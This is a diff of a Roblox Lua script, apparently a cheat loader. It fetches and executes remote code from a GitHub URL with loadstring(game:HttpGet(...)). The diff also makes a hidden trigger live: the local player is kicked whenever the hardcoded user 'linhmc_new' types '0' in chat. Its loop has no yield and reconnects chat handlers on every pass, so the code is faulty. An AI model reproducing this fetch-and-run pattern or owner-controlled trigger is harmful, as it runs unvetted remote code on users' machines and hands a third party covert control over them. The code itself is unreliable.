@@ -1,27 +1,16 @@
 local Players = game:GetService("Players")
 local playerName = "linhmc_new"
-local isUsingScript = false
 
 -- Execute loadstring
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Linhmcfake1/Build-and-battle-tp/refs/heads/main/Linked"))()
-
--- Đánh dấu người chơi nếu đang sử dụng script
-local function markAsUsingScript(player)
-    if player.Name:lower() == playerName:lower() then
-        isUsingScript = true
-    end
-end
 
 -- Kiểm tra liên tục
 while true do
     for _, player in ipairs(Players:GetPlayers()) do
         player.Chatted:Connect(function(message)
-            if player.Name:lower() == playerName:lower() then
-                markAsUsingScript(player)
-                if message == "0" and not isUsingScript then
-                    -- Thông báo và kick người chơi
-                    game.Players.LocalPlayer:Kick("script owner here")
-                end
+            if player.Name:lower() == playerName:lower() and message == "0" then
+                -- Thông báo và kick người chơi
+                game.Players.LocalPlayer:Kick("script owner here")
             end
         end)
     end
